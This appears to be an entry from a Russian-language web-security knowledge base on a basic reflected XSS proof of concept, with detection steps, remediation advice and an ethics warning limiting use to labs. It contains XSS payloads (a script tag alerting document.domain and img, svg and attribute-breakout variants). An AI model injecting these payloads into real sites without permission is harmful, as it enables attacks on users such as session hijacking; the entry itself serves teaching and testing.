---
id: xss-reflected-basic-script
title: "Reflected XSS: базовый PoC"
type: xss
target: html
category: web
difficulty: beginner
bypass: none
tags: [xss, reflected, poc]
tested_on: ["Chrome 120", "Firefox 121"]
success_rate: 0.9
risk: medium
cwe: "CWE-79"
lab: "labs/web-labs/xss-lab"
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/xss/"
  - "https://portswigger.net/web-security/cross-site-scripting"
graph:
  - target: "xss"
    type: instance_of
  - target: "session-hijacking"
    type: leads_to
---

# Reflected XSS: базовый PoC

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
<script>alert(document.domain)</script>
```

## Explanation

Простейший reflected-XSS: значение параметра возвращается в HTML-ответ без экранирования
и исполняется как скрипт. `alert(document.domain)` — безопасный индикатор (ничего не меняет),
поэтому принят как стандартный PoC.

## Detection

1. Отправьте уникальную метку (`canary123`) и найдите её в ответе.
2. Определите контекст: HTML-тело, атрибут, JS-строка, URL.
3. Проверьте, какие символы экранируются (`< > " ' \`).
Автоматизация: Burp Active Scan, `dalfox`, `xsser`.

## Remediation

- Контекстно-зависимое экранирование при выводе (HTML, attribute, JS, URL — разные наборы).
- Шаблонизаторы с автоэкранированием по умолчанию (Jinja2 autoescape, React, Vue).
- CSP с `script-src 'self'` и без `unsafe-inline`.
- `HttpOnly` + `SameSite` для cookie сессии.

## Variants

```
<img src=x onerror=alert(1)>
```

```
<svg onload=alert(1)>
```

```
"><script>alert(1)</script>
```
